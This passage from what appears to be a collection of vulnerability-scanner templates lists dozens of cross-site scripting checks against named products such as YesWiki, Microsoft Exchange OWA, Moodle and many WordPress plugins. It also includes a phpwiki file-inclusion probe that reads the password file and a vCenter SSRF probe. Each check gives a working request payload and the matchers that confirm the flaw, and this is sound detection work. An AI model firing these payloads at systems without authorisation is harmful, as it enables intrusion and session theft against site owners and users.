**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<svg/onload=alert(/xss/)>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# YesWiki \<2022-07-07 - Cross-Site Scripting
## Description
- YesWiki before 2022-07-07 contains a cross-site scripting vulnerability via the id parameter in the AccueiL URL.

- severity - high
- tags - yeswiki,unauth,huntr,cve,cve2022,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>
    2. Query failed:
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Ckan - DOM Cross-Site Scripting
## Description
- Ckan contains a cross-site scripting vulnerability in the document object model via the previous version of the jQuery Sparkle library. An attacker can execute arbitrary script and thus can steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - dom,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/?{alert(1)}
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<option value="/en/?{alert(1)}" selected="selected">

**Type - word**
- words
    1. text/html
- part - header

---
# ZZCMS - Cross-Site Scripting
## Description
- ZZCMS contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - zzcms,xss,authenticated
## Requests
### Step - 1
```
POST /admin/logincheck.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

admin={{username}}&pass={{password}}

```
### Step - 2
```
GET /admin/usermodify.php?id=1%22%2balert(document.domain)%2b%22 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_2, 'text/html')
    2. status_code_2 == 200
    3. contains(body_2, "参数 1\"+alert(document.domain)+")
- condition - and

---
# Lucee - Cross-Site Scripting
## Description
- Lucee contains a cross-site scripting vulnerability. It allows remote attackers to inject arbitrary JavaScript into the responses returned by the server.
- severity - high
- tags - lucee,xss,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/lucees3ezf%3cimg%20src%3da%20onerror%3dalert('{{randstr}}')%3elujb7/admin/imgProcess.cfm
- {{BaseURL}}/lucee/lucees3ezf%3cimg%20src%3da%20onerror%3dalert('{{randstr}}')%3elujb7/admin/imgProcess.cfm
### Matchers

**Type - word**
- words
    1. \<img src=a onerror=alert('{{randstr}}')>
    2. MissingIncludeException
    3. lucee-err
- part - body
- condition - and

---
# KafDrop - Cross-Site Scripting
## Description
- KafDrop contains a cross-site scripting vulnerability. It allows remote unauthenticated attackers to inject arbitrary HTML and/or JavaScript into the response returned by the server.
- severity - high
- tags - kafdrop,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E
### Matchers

**Type - word**
- words
    1. Kafdrop
    2. \<img src=x onerror=alert(2)>
- part - body
- condition - and

**Type - status**
- status
    1. 500

---
# GeoVision Geowebserver 5.3.3 - Cross-Site Scripting
## Description
- GeoVision Geowebserver 5.3.3 and prior versions are vulnerable to several cross-site scripting / HTML injection / local file inclusion / XML injection / code execution vectors because the application fails to properly sanitize user requests.
- severity - high
- tags - geowebserver,xss,packetstorm
## Requests
### Step - 1
```
GET /Visitor/bin/WebStrings.srf?file=&obj_name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
Accept: */*

```
### Matchers

**Type - regex**
- regex
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# Parallels H-Sphere - Cross-Site Scripting
## Description
- Parallels H-Sphere contains multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data. An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.

- severity - high
- tags - hsphere,xss,edb,parallels
## Requests
- Method - GET
### URL
- {{BaseURL}}/webshell4/login.php?err=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
- {{BaseURL}}/webshell4/login.php?login=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. value="\">\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Mida eFramework - Cross-Site Scripting
## Description
- Mida eFramework contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - mida,xss,edb
## Requests
### Step - 1
```
POST /MUP/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{Hostname}}/MUP

UPusername=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E&UPpassword=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E

```
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. ">\<script>javascript:alert(document.cookie)\</script>

---
# Microsoft Exchange Server - Cross-Site Scripting
## Description
- Microsoft Exchange Server, or OWA, is vulnerable to a cross-site scripting vulnerability in refurl parameter of frowny.asp.
- severity - high
- tags - microsoft,exchange,owa,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//
### Matchers

**Type - word**
- words
    1. alert(document.domain)//&et=ServerError
    2. mail/bootr.ashx
- condition - and

**Type - status**
- status
    1. 500

**Type - word**
- words
    1. text/html
- part - header

---
# Microweber Cross-Site Scripting
## Description
- Microweber prior to 1.2.11 is susceptible to reflected cross-site Scripting via Packagist microweber/microweber.
- severity - high
- tags - microweber,xss,oss
## Requests
- Method - GET
### URL
- {{BaseURL}}/editor_tools/module?type=files/admin">\<script>alert(document.domain)\</script>&params=filetype=images#path=
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>" 0="filetype=images"

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Sickbeard - Cross-Site Scripting
## Description
- Sickbeard contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<svg/onload=alert(document.domain)>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# PHP Timeclock \<=1.04 - Cross-Site Scripting
## Description
- PHP Timeclock 1.04 and prior contains multiple cross-site scripting vulnerabilities via login.php, timeclock.php, reports/audit.php. and reports/timerpt.php
- severity - high
- tags - xss,php,timeclock,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/login.php/'%3E%3Csvg/onload=alert%60{{randstr}}%60%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<svg/onload=alert`{{randstr}}`>
    2. PHP Timeclock Admin Login
- part - body
- condition - and

**Type - word**
- words
    1. text/html
- part - header

---
# Online Farm Management System 0.1.0 - Cross-Site Scripting
## Description
- Online Farm Management System 0.1.0 contains a cross-site scripting vulnerability via the review.php file.

- severity - high
- tags - onlinefarm,cms,xss,edb
## Requests
### Step - 1
```
POST /reviewInput.php?pid=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&rating=0

```
### Matchers

**Type - word**
- part - body
- words
    1. \<em style="color: black;">\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Global Domains International - Cross-Site Scripting
## Description
- Sites hosted by Global Domains International, Inc. have cross-site scripting and directory traversal vulnerabilities.

- severity - high
- tags - globaldomains,xss,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.dhtml?sponsor=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# JavaMelody - Cross-Site Scripting
## Description
- JavaMelody contains a cross-site scripting vulnerability via the monitoring parameter. An attacker can execute arbitrary script in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - xss,javamelody
## Requests
- Method - GET
### URL
- {{BaseURL}}/monitoring?part=graph&graph=usedMemory%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Chamilo LMS 1.11.14 Cross-Site Scripting
## Description
- Chamilo LMS 1.11.14 is vulnerable to cross-site scripting.
- severity - high
- tags - xss,chamilo
## Requests
- Method - GET
### URL
- {{BaseURL}}/main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+"
### Matchers

**Type - word**
- part - body
- words
    1. agenda_js.php?type=xss" onmouseover=alert(document.domain)

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# Nginx Virtual Host Traffic Status Module - Cross-Site Scripting
## Description
- Nginx Virtual Host Traffic Status Module contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - nginx,xss,status
## Requests
- Method - GET
### URL
- {{BaseURL}}/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<script>alert(31337)\</script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Dzzoffice 2.02.1 - Cross-Site Scripting
## Description
- Dzzoffice 2.02.1_SC_UTF8 contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary web script or HTML via the zero parameter.

- severity - high
- tags - dzzoffice,xss
## Requests
### Step - 1
```
POST /index.php?mod=system&op=orgtree&do=orgtree HTTP/1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

id=%23&nouser=0&moderator=0&zero=<img+src=x+onerror=alert(document.domain)>&stype=0&range=0&showjob=0

```
### Matchers

**Type - word**
- words
    1. "text":"\<img src=x onerror=alert(document.domain)>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Keycloak \<=8.0 - Cross-Site Scripting
## Description
- Keycloak 8.0 and prior contains a cross-site scripting vulnerability.  An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
- severity - info
- tags - keycloak,xss
## Requests
### Step - 1
```
POST /auth/realms/master/clients-registrations/openid-connect HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"<img onerror=confirm(1337) src/>":1}

```
### Matchers

**Type - status**
- status
    1. 400

**Type - word**
- words
    1. Unrecognized field "\<img onerror=confirm(1337) src/>"

---
# SteVe - Cross-Site Scripting
## Description
- The aim of SteVe is to support the deployment and popularity of electric mobility. SteVe provides basic functions for the administration of charge points.

- severity - medium
- tags - steve,xss,oss
## Requests
- Method - GET
### URL
- {{BaseURL}}/steve/services/"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/services/
- {{BaseURL}}/services/"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/services/
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>/services/?stylesheet=1">

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# SiteMinder - DOM Cross-Site Scripting
## Description
- SiteMinder contains a cross-site scripting vulnerability in the document object model. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - dom,xss,siteminder
## Requests
- Method - GET
### URL
- {{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7
- {{BaseURL}}/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7
### Matchers

**Type - word**
- words
    1. \u003d\u0022confirm(document.domain)\u0022\u003e\</B> you cannot access your

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# YesWiki - Stored Cross-Site Scripting
## Description
- YesWiki contains a stored contains a cross-site scripting vulnerability via the bf_text field when adding a new entry for Forum.

- severity - high
- tags - yeswiki,xss,stored,huntr
## Requests
### Step - 1
```
POST /?BazaR&vue=saisir&action=saisir_fiche&id=2 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT8dS2PT0WtxACLyu

------WebKitFormBoundaryT8dS2PT0WtxACLyu
Content-Disposition: form-data; name="bf_titre"

blog
------WebKitFormBoundaryT8dS2PT0WtxACLyu
Content-Disposition: form-data; name="bf_text"

"><img src=x onerror=console.log(123);>
------WebKitFormBoundaryT8dS2PT0WtxACLyu
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundaryT8dS2PT0WtxACLyu
Content-Disposition: form-data; name="bf_description"

abcd
------WebKitFormBoundaryT8dS2PT0WtxACLyu
Content-Disposition: form-data; name="fichierbf_file"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundaryT8dS2PT0WtxACLyu
Content-Disposition: form-data; name="antispam"

1
------WebKitFormBoundaryT8dS2PT0WtxACLyu
Content-Disposition: form-data; name="id_typeannonce"

2
------WebKitFormBoundaryT8dS2PT0WtxACLyu--

```
### Step - 2
```
GET /?BazaR&vue=consulter HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_2, 'text/html') && contains(all_headers_2, 'YesWiki')
    2. status_code_2 == 200
    3. contains(body_2, '>\<img src=x onerror=console.log(123);>')
- condition - and

---
# Hospital Management System 1.0 - Cross-Site Scripting
## Description
- Hospital Management System 1.0 contains a cross-site scripting vulnerability via the searchdata parameter in patient-search.php.

- severity - high
- tags - hms,hospital,cms,xss,authenticated
## Requests
### Step - 1
```
POST /hms/admin/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&submit=

```
### Step - 2
```
POST /hms/admin/patient-search.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

searchdata=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&search=

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_2, "text/html")
    2. status_code_2 == 200
    3. contains(body_2, 'Result against \"\<script>alert(document.domain)\</script>\" keyword')
- condition - and

---
# FlatPress 1.2.1 - Stored Cross-Site Scripting
## Description
- FlatPress 1.2.1 contains a stored cross-site scripting vulnerability that allows for arbitrary execution of JavaScript commands through blog content. An attacker can steal cookie-based authentication credentials and launch other attacks. Note: this is similar to CVE-2021-41432, however this attack uses the "page" parameter.

- severity - medium
- tags - flatpress,xss,authenticated,oss
## Requests
### Step - 1
```
POST /login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykGJmx9vKsePrMkVp

------WebKitFormBoundarykGJmx9vKsePrMkVp
Content-Disposition: form-data; name="user"

{{username}}
------WebKitFormBoundarykGJmx9vKsePrMkVp
Content-Disposition: form-data; name="pass"

{{password}}
------WebKitFormBoundarykGJmx9vKsePrMkVp
Content-Disposition: form-data; name="submit"

Login
------WebKitFormBoundarykGJmx9vKsePrMkVp--

```
### Step - 2
```
GET /admin.php?p=static&action=write&page=%22onfocus%3d%22alert%28document.cookie%29%22autofocus%3d%22 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- words
    1. value=""onfocus="alert(document.cookie)"autofocus=""
    2. FlatPress
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# TurboCRM - Cross-Site Scripting
## Description
- TurboCRM contains a cross-site scripting vulnerability which allows a remote attacker to inject arbitrary JavaScript into the response returned by the application.
- severity - high
- tags - xss,turbocrm
## Requests
- Method - GET
### URL
- {{BaseURL}}/login/forgetpswd.php?loginsys=1&loginname=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - word**
- words
    1. ">\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# phpwiki 1.5.4 - Cross-Site Scripting/Local File Inclusion
## Description
- phpwiki 1.5.4 is vulnerable to cross-site scripting and local file inclusion, and allows remote unauthenticated attackers to include and return the content of locally stored files via the 'index.php' endpoint.
- severity - high
- tags - xss,edb,phpwiki,lfi
## Requests
- Method - GET
### URL
- {{BaseURL}}/phpwiki/index.php/passwd
### Matchers

**Type - regex**
- regex
    1. root:[x*]:0:0

**Type - status**
- status
    1. 200

---
# Vanguard Marketplace CMS 2.1 - Cross-Site Scripting
## Description
- Vanguard Marketplace CMS 2.1 contains a cross-site scripting vulnerability in the message and product title tags and in the product search box.
- severity - high
- tags - vanguard,xss,packetstorm
## Requests
### Step - 1
```
POST /search HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

```
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# EmpireCMS 7.5 - Cross-Site Scripting
## Description
- EmpireCMS 7.5 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - empirecms,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/e/ViewImg/index.html?url=javascript:alert(document.domain)
### Matchers

**Type - word**
- words
    1. onmousewheel=\"return bbimg(this)\"

**Type - status**
- status
    1. 200

---
# Moodle Jsmol - Cross-Site Scripting
## Description
- Moodle contains a cross-site scripting vulnerability via the Jsmol plugin and may also be susceptible to local file inclusion or server-side-request forgery. An attacker can execute arbitrary script in the browser of an unsuspecting user and steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - moodle,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&mimetype=text/html
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<script>alert('XSS')\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

---
# Moodle - Cross-Site Scripting
## Description
- Moodle 3.10 to 3.10.3, 3.9 to 3.9.6, 3.8 to 3.8.8, and earlier unsupported versions contain a cross-site scripting vulnerability via the redirect_uri parameter.
- severity - medium
- tags - moodle,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/mod/lti/auth.php?redirect_uri=javascript:alert('{{randstr}}')
### Matchers

**Type - word**
- part - body
- words
    1. {{randstr}}
    2. \<form action="javascript:alert
- condition - and

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site Scripting
## Description
- VMware vCenter 7.0.2.00100 is susceptible to multiple vulnerabilities including server-side request forgery, local file inclusion, and cross-site scripting.
- severity - critical
- tags - ssrf,lfi,xss,oast,vcenter,vmware
## Requests
- Method - GET
### URL
- {{BaseURL}}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://{{interactsh-url}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - status**
- status
    1. 200

---
# EmpireCMS DOM Cross Site-Scripting
## Description
- EmpireCMS is vulnerable to a DOM based cross-site scripting attack.
- severity - high
- tags - empirecms,cnvd,cnvd2021,xss,domxss
## Requests
- Method - GET
### URL
- {{BaseURL}}/e/ViewImg/index.html?url=javascript:alert(1)
### Matchers

**Type - word**
- part - body
- words
    1. if(Request("url")!=0)
    2. href=\""+Request("url")+"\"
- condition - and

**Type - status**
- status
    1. 200

---
# window.name - DOM Cross-Site Scripting
## Description
- The window-name is vulnerable to DOM based cross-site scripting.
- severity - high
- tags - headless,xss,domxss

---
# ClickDesk Live Support Live Chat 2.0 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in clickdesk.php in ClickDesk Live Support - Live Chat plugin 2.0 for WordPress allows remote attackers to inject arbitrary web script or HTML via the cdwidgetid parameter.
- severity - medium
- tags - cve,cve2011,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/clickdesk-live-support-chat/clickdesk.php?cdwidgetid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# GRAND FlAGallery 1.57 - Cross-Site Scripting
## Description
- A cross-site scripting (XSS) vulnerability in facebook.php in the GRAND FlAGallery plugin (flash-album-gallery) before 1.57 for WordPress allows remote attackers to inject arbitrary web script or HTML via the i parameter.
- severity - medium
- tags - cve,cve2011,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/flash-album-gallery/facebook.php?i=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Tiki Wiki CMS Groupware 7.0 Cross-Site Scripting
## Description
- Tiki Wiki CMS Groupware 7.0 is vulnerable to cross-site scripting via the GET "ajax" parameter to snarf_ajax.php.
- severity - medium
- tags - seclists,cve,cve2011,xss,tikiwiki
## Requests
- Method - GET
### URL
- {{BaseURL}}/snarf_ajax.php?url=1&ajax=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# Featurific For WordPress 1.6.2 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in cached_image.php in the Featurific For WordPress plugin 1.6.2 for WordPress allows remote attackers to inject arbitrary web script or HTML via the snum parameter.
- severity - medium
- tags - cve,cve2011,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/featurific-for-wordpress/cached_image.php?snum=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Adminimize 1.7.22 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in adminimize/adminimize_page.php in the Adminimize plugin before 1.7.22 for WordPress allows remote attackers to inject arbitrary web script or HTML via the page parameter.
- severity - medium
- tags - cve,cve2011,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/adminimize/adminimize_page.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Alert Before Your Post \<= 0.1.1 - Cross-Site Scripting
## Description
- A cross-site scripting  vulnerability in post_alert.php in Alert Before Your Post plugin, possibly 0.1.1 and earlier, for WordPress allows remote attackers to inject arbitrary web script or HTML via the name parameter.
- severity - medium
- tags - cve,cve2011,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/alert-before-your-post/trunk/post_alert.php?name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Advanced Text Widget \< 2.0.2 - Cross-Site Scripting
## Description
- A cross-site scripting (XSS) vulnerability in advancedtext.php in Advanced Text Widget plugin before 2.0.2 for WordPress allows remote attackers to inject arbitrary web script or HTML via the page parameter.
- severity - medium
- tags - cve,cve2011,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/advanced-text-widget/advancedtext.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Plugin Flexible Custom Post Type \< 0.1.7 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in edit-post.php in the Flexible Custom Post Type plugin before 0.1.7 for WordPress allows remote attackers to inject arbitrary web script or HTML via the id parameter.
- severity - medium
- tags - cve,cve2011,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Skysa App Bar 1.04 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in skysa-official/skysa.php in Skysa App Bar Integration plugin, possibly before 1.04, for WordPress allows remote attackers to inject arbitrary web script or HTML via the submit parameter.
- severity - medium
- tags - cve,cve2011,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/skysa-official/skysa.php?submit=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Plugin Duplicator \< 0.4.5 - Cross-Site Scripting
## Description
- A cross-site scripting  vulnerability in files/installer.cleanup.php in the Duplicator plugin before 0.4.5 for WordPress allows remote attackers to inject arbitrary web script or HTML via the package parameter.
- severity - medium
- tags - seclists,cve,cve2013,wordpress,xss,wp-plugin,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/duplicator/files/installer.cleanup.php?remove=1&package=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Spreadsheet - Cross-Site Scripting
## Description
- WordPress Spreadsheet plugin contains a reflected cross-site scripting vulnerability in /dhtmlxspreadsheet/codebase/spreadsheet.php.

- severity - medium
- tags - wp,wpscan,cve,cve2013,wordpress,xss,wp-plugin
## Requests
### Step - 1
```
GET /wp-content/plugins/dhtmlxspreadsheet/codebase/spreadsheet.php?page=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. page: '\<script>alert(document.domain)\</script>'
    2. dhx_rel_path
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Plugin Uploader 1.0.4 - Cross-Site Scripting
## Description
- Multiple cross-site scripting  vulnerabilities in views/notify.php in the Uploader plugin 1.0.4 for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) notify or (2) blog parameter.
- severity - medium
- tags - cve,cve2013,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/uploader/views/notify.php?notify=unnotif&blog=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Plugin Category Grid View Gallery 2.3.1 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in includes/CatGridPost.php in the Category Grid View Gallery plugin 2.3.1 for WordPress allows remote attackers to inject arbitrary web script or HTML via the ID parameter.
- severity - medium
- tags - cve2013,wordpress,xss,wp-plugin,seclists,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/category-grid-view-gallery/includes/CatGridPost.php?ID=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Plugin Traffic Analyzer - 'aoid' Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in js/ta_loaded.js.php in the Traffic Analyzer plugin, possibly 3.3.2 and earlier, for WordPress allows remote attackers to inject arbitrary web script or HTML via the aoid parameter."
